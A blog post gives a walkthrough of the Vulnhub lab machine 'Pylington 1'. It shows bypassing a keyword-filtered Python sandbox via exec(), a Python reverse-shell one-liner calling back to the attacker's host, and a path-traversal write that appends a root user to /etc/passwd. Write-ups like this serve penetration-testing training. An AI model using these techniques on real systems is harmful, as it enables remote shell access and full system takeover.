<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="PYLINGTON 1" /><meta name="author" content="am-a-circle" /><meta property="og:locale" content="en" /><meta name="description" content="Overview" /><meta property="og:description" content="Overview" /><link rel="canonical" href="https://am-a-circle.github.io//posts/PYLINGTON_1/" /><meta property="og:url" content="https://am-a-circle.github.io//posts/PYLINGTON_1/" /><meta property="og:site_name" content="am-a-circle" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-04-25T20:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="PYLINGTON 1" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@am-a-circle" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"am-a-circle"},"headline":"PYLINGTON 1","dateModified":"2021-12-24T21:45:01+08:00","datePublished":"2021-04-25T20:00:00+08:00","description":"Overview","url":"https://am-a-circle.github.io//posts/PYLINGTON_1/","mainEntityOfPage":{"@type":"WebPage","@id":"https://am-a-circle.github.io//posts/PYLINGTON_1/"},"@type":"BlogPosting","@context":"https://schema.org"}</script><title>PYLINGTON 1 | am-a-circle</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="am-a-circle"><meta name="application-name" content="am-a-circle"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">am-a-circle</a></div><div class="site-subtitle font-italic">Logs of my roots.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/privesc/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>PRIVESC</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/am-a-circle" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>PYLINGTON 1</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>PYLINGTON 1</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> am-a-circle </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Apr 25, 2021, 8:00 PM +0800" >Apr 25, 2021<i class="unloaded">2021-04-25T20:00:00+08:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Dec 24, 2021, 9:45 PM +0800" >Dec 24, 2021<i class="unloaded">2021-12-24T21:45:01+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1574 words">8 min read</span></div></div><div class="post-content"><h2 id="overview">Overview</h2><p>“PYLINGTON: 1” was quite a unique box as it really it good for you to think out of the box for ways to exploit the system.</p><div class="table-wrapper"><table><thead><tr><th>Box Difficulty<th>Link<tbody><tr><td>Medium(personally)<td><a href="https://www.vulnhub.com/entry/pylington-1,684/">Vulnhub Link</a></table></div><p>For this box I downloaded it off vulnhub and run it on my network.</p><h2 id="recon">Recon</h2><p>After setting up the VM and it’s connection , to locate the ip I use arp-scan my-ipaddress/24 to find the ip. Pylington was hosted on 192.168.1.50</p><p>As usual, the standard masscan follow by nmap.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>└─# masscan <span class="nt">-p1-65535</span>  192.168.1.50  <span class="nt">--rate</span><span class="o">=</span>1000 <span class="nt">-e</span> eth0

Starting masscan 1.3.2 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2021-04-24 17:03:10 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts <span class="o">[</span>65535 ports/host]
Discovered open port 80/tcp on 192.168.1.50                   
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>└─# nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p</span> 80 192.168.1.50                        


Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-24 13:06 EDT
Nmap scan report <span class="k">for </span>192.168.1.50
Host is up <span class="o">(</span>0.00033s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.46 <span class="o">((</span>Unix<span class="o">)</span> mod_wsgi/4.7.1 Python/3.9<span class="o">)</span>
|_http-generator: Jekyll v4.1.1
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries 
|_/register /login /zbir7mn240soxhicso2z
|_http-server-header: Apache/2.4.46 <span class="o">(</span>Unix<span class="o">)</span> mod_wsgi/4.7.1 Python/3.9
|_http-title: Pylington Cloud | The best way to run Python.
MAC Address: 08:00:27:15:1C:66 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>6.86 seconds

</pre></table></code></div></div><p>From the output we can see that there is only port 80 HTTP open.</p><h2 id="http---tcp-80">HTTP - TCP 80</h2><p>From the nmap output we can see that there are interesting files shown in the robot.txt file:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>| http-robots.txt: 3 disallowed entries
|_/register /login /zbir7mn240soxhicso2z
</pre></table></code></div></div><p>Let check these one by one to see if there are anything interesting here:</p><h3 id="register">/Register:</h3><p><img data-proofer-ignore data-src="/Images/Pylington/1.png" alt="plot" /></p><p>We can see that the photo above mentions that <strong>“Unfortunately, at this time, all but one of our servers have gone offline. As a result, we are not accepting any new registrations. However, if you are already a registered user, you can still sign in.”</strong></p><p>Welp, nothing else here.</p><h3 id="login">/Login:</h3><p><img data-proofer-ignore data-src="/Images/Pylington/2.png" alt="plot" /></p><p>The login page requires not only a username and password, but a challenge text where based on the equation given you have to give the output. Look’s like brute-forcing the users name and password might not be the right path here.</p><h3 id="zbir7mn240soxhicso2z">/zbir7mn240soxhicso2z</h3><p><img data-proofer-ignore data-src="/Images/Pylington/3.png" alt="plot" /></p><p>Lastly, the last site shows that it stores the credential.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>Username: steve
Password: bvbkukHAeVxtjjVH
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/Images/Pylington/4.png" alt="plot" /></p><p>After logging in with the credentials above back at /Login, we are directed to here which allow us to access the <strong><em>Super Secret Python IDE</em></strong>.</p><p><img data-proofer-ignore data-src="/Images/Pylington/5.png" alt="plot" /></p><p>It looks like the IDE is a</p><ul><li>Python 3 program<li>in the first input box is where we put our code<li>In the second input box is the user input.</ul><p>It is noted that it is protected by the below <strong><em>“This online IDE is protected with NoImportOS™, an unescapable™ sandbox. NoImportOS™ is secure because of its simplicity; “</em></strong></p><p>A quick look at the security measurement of the code shows the below:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">check_if_safe</span><span class="p">(</span><span class="n">code</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
    <span class="k">if</span> <span class="s">'import'</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span> <span class="c1"># import is too dangerous
</span>        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">elif</span> <span class="s">'os'</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span> <span class="c1"># os is too dangerous
</span>        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">elif</span> <span class="s">'open'</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span> <span class="c1"># opening files is also too dangerous
</span>        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">True</span>
</pre></table></code></div></div><h2 id="shell-as-http">Shell as HTTP</h2><p>Let’s do some serious thinking here! Our goal is obviously to get back a reverse shell back to the server , but looks like we cannot have the words <strong><em>import,os or open.</em></strong> Meaning we cannot import other python functions , import the os module or openany files.</p><p>However take note , we still have access to other python builtin function!</p><p>Let’s test to see if the above is true first.</p><p><img data-proofer-ignore data-src="/Images/Pylington/6.png" alt="plot" /></p><p>Okay, as expected, we can’t directly import . What if <code class="language-plaintext highlighter-rouge">import</code> is taken as a user input?</p><p><img data-proofer-ignore data-src="/Images/Pylington/7.png" alt="plot" /></p><p>Great, looks like the program doesn’t do a check on the input. So now we just have to find a way to execute the strings input as a command.</p><p>After doing some research I found the below:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>Python’s exec() method executes the Python code you pass as a string or executable object argument.
This is called dynamic execution because, in contrast to normal static Python code, you can generate code and execute it at runtime. This way, you can run programmatically-created Python code.
</pre></table></code></div></div><p>I tried executing with the eval function at first but fail to do so. The reason why eval can’t be used is explained as the below.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>exec() can execute all Python source code, whereas eval() can only evaluate expressions.
exec() always returns None, whereas eval() returns the result of the evaluated expression.
</pre></table></code></div></div><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">eval</span><span class="p">(</span><span class="mi">2</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span>
<span class="o">&gt;</span> <span class="mi">4</span>
</pre></table></code></div></div><p>Thus i crafted the a simple python script which take a user input and run the string input through the exec() python3 function.</p><p>Python Code:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">user_inp</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">''</span><span class="p">)</span>
<span class="k">exec</span><span class="p">(</span><span class="n">user_inp</span><span class="p">)</span>
</pre></table></code></div></div><p>User Input:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>import socket,subprocess,os<span class="p">;</span><span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span><span class="p">;</span>s.connect<span class="o">((</span><span class="s2">"192.168.1.152"</span>,4242<span class="o">))</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,0<span class="o">)</span><span class="p">;</span> os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,1<span class="o">)</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,2<span class="o">)</span><span class="p">;</span>import pty<span class="p">;</span> pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/Images/Pylington/8.png" alt="plot" /></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>└─# nc <span class="nt">-lvnp</span> 4242                                                                                                                                                     
listening on <span class="o">[</span>any] 4242 ...
connect to <span class="o">[</span>192.168.1.152] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.1.50] 52724
<span class="o">[</span>http@archlinux /]<span class="nv">$ </span><span class="nb">whoami
whoami
</span>http
<span class="o">[</span>http@archlinux /]<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>http<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>http<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>http<span class="o">)</span>
<span class="o">[</span>http@archlinux /]<span class="nv">$ </span>
</pre></table></code></div></div><p>Great we are now onto the server as HTTP user.</p><h2 id="shell-as-py">shell as py</h2><p>After doing some standard enumeration like running linpeas and other enumeration tool, the below stands out to me.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>http@archlinux tmp]<span class="nv">$ </span>python3 suid3num.py                                                                                                                                 
…
<span class="o">[</span>~] Custom SUID Binaries <span class="o">(</span>Interesting Stuff<span class="o">)</span>
<span class="nt">------------------------------</span>
/home/py/typing
/usr/bin/ksu
/usr/bin/chage
/usr/bin/sg
/usr/bin/unix_chkpwd
/usr/bin/expiry
/usr/bin/suexec
<span class="nt">------------------------------</span>
…
…    
</pre></table></code></div></div><p>Let’s try running the <code class="language-plaintext highlighter-rouge">/home/py/typing</code> to see what it does. After running this the program, it seems to ask me to type the sentence <code class="language-plaintext highlighter-rouge">the quick brown fox jumps over the lazy dog</code> in order for it to give me a password.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>[http@archlinux tmp]$ /home/py/typing
/home/py/typing
Lets play a game! If you can type the sentence below, then I'll tell you my password.

the quick brown fox jumps over the lazy dog
</pre></table></code></div></div><p>After typing the above sentence back into the program it output the password:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>the quick brown fox jumps over the lazy dog
54ezhCGaJV
</pre></table></code></div></div><p>Let’s try logging in as user py with the password above.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="o">[</span>http@archlinux tmp]<span class="nv">$ </span>su <span class="nt">-l</span> py
su <span class="nt">-l</span> py
Password: 54ezhCGaJV

<span class="o">[</span>py@archlinux ~]<span class="nv">$ </span><span class="nb">whoami
whoami
</span>py
<span class="o">[</span>py@archlinux ~]<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>py<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>py<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>py<span class="o">)</span>
</pre></table></code></div></div><p>Great we are now have a shell as user py.</p><h2 id="shell-as-root">Shell as Root</h2><p>Doing a quick enumeration on py folder we can observe the below :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="o">[</span>py@archlinux ~]<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="nb">ls</span> <span class="nt">-la</span>
total 56
dr-xr-xr-x 3 py   py    4096 Apr 16 23:41 <span class="nb">.</span>
drwxr-xr-x 3 root root  4096 Apr  7 18:43 ..
<span class="nt">-rw-------</span> 1 py   py      21 Dec 20 18:44 .bash_logout
<span class="nt">-rw-------</span> 1 py   py      57 Dec 20 18:44 .bash_profile
<span class="nt">-rw-------</span> 1 py   py     141 Dec 20 18:44 .bashrc
<span class="nt">-r--------</span> 1 py   py      11 Apr  9 12:04 password.txt
drwx------ 2 py   py    4096 Apr  9 19:31 secret_stuff
<span class="nt">-r-sr-xr-x</span> 1 py   py   19216 Apr  9 12:15 typing
<span class="nt">-r--r--r--</span> 1 py   py     689 Apr  9 12:15 typing.cc
<span class="nt">-r--------</span> 1 py   py      34 Apr  9 12:32 user.txt
<span class="o">[</span>py@archlinux ~]<span class="nv">$ </span><span class="nb">cd </span>secret_stuff
<span class="nb">cd </span>secret_stuff
<span class="o">[</span>py@archlinux secret_stuff]<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="nb">ls</span> <span class="nt">-la</span>
total 40
drwx------ 2 py   py    4096 Apr  9 19:31 <span class="nb">.</span>
dr-xr-xr-x 3 py   py    4096 Apr 16 23:41 ..
<span class="nt">-rwsr-xr-x</span> 1 root root 26128 Apr  9 19:30 backup
<span class="nt">-rw-r--r--</span> 1 root root   586 Apr  9 19:30 backup.cc
<span class="o">[</span>py@archlinux secret_stuff]<span class="nv">$ </span>
</pre></table></code></div></div><p>Interestingly , we can execute <code class="language-plaintext highlighter-rouge">backup</code> file even though the file is owned by root. Let’s take a look what this interesting file does.</p><p>Running the program shows the below :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="o">[</span>py@archlinux secret_stuff]<span class="nv">$ </span>./backup
./backup
Enter a line of text to back up: 123
123
Enter a file to append the text to <span class="o">(</span>must be inside the /srv/backups directory<span class="o">)</span>: /tmp
/tmp
The file must be inside the /srv/backups directory!
</pre></table></code></div></div><ol><li>The program take in a user input<li>Write it to a file which starts at /srv/backups directory.</ol><p>But what if point it to /srv/backups directory initially but chain it with directory traversal to point to somewhere else like py home folder?</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="o">[</span>py@archlinux secret_stuff]<span class="nv">$ </span>./backup
./backup
Enter a line of text to back up: 123
123
Enter a file to append the text to <span class="o">(</span>must be inside the /srv/backups directory<span class="o">)</span>: /srv/backups/../../../../../../../home/py/touchme.txt
/srv/backups/../../../../../../../home/py/touchme.txt
<span class="o">[</span>py@archlinux secret_stuff]<span class="nv">$ </span><span class="nb">cat</span> /home/py/touchme.txt
<span class="nb">cat</span> ../touchme.txt
123
</pre></table></code></div></div><p>Success!</p><p>Now that we know that we can write to any file , a common privilege escalation method is to write to /etc/passwd folder which create a user running as root</p><p>We can manually add a user “admin” with a password of “password” using the following syntax which home folder points at root. :</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>admin:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:0:0:,,,:/root:/bin/bash
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="o">[</span>py@archlinux secret_stuff]<span class="nv">$ </span>./backup                                                                                                                           
./backup                                                                                                                                                                  
Enter a line of text to back up: admin:<span class="nv">$1$xtTrK</span>/At<span class="nv">$Ga7qELQGiIklZGDhc6T5J0</span>:0:0:,,,:/root:/bin/bash                                                                         
admin:<span class="nv">$1$xtTrK</span>/At<span class="nv">$Ga7qELQGiIklZGDhc6T5J0</span>:0:0:,,,:/root:/bin/bash                                                                                                          
Enter a file to append the text to <span class="o">(</span>must be inside the /srv/backups directory<span class="o">)</span>: /srv/backups/../../../../../etc/passwd                                                    
/srv/backups/../../../../../etc/passwd                                                                                                                                    
<span class="o">[</span>py@archlinux secret_stuff]<span class="nv">$ </span>su <span class="nt">-l</span> admin
su <span class="nt">-l</span> admin
Password: password

<span class="o">[</span>root@archlinux ~]# <span class="nb">whoami
whoami
</span>root
<span class="o">[</span>root@archlinux ~]# <span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>

</pre></table></code></div></div><p>And we are root!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/vulnhub/'>Vulnhub</a>, <a href='/categories/medium/'>medium</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writable-etc-passwd-file/" class="post-tag no-text-decoration" >Writable /etc/passwd file</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=PYLINGTON 1 - am-a-circle&url=https://am-a-circle.github.io//posts/PYLINGTON_1/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=PYLINGTON 1 - am-a-circle&u=https://am-a-circle.github.io//posts/PYLINGTON_1/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=PYLINGTON 1 - am-a-circle&url=https://am-a-circle.github.io//posts/PYLINGTON_1/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/CarPT-Part1/">Automobile Hacking - Part 1</a><li><a href="/posts/CarPT-Part2/">Automobile Hacking - Part 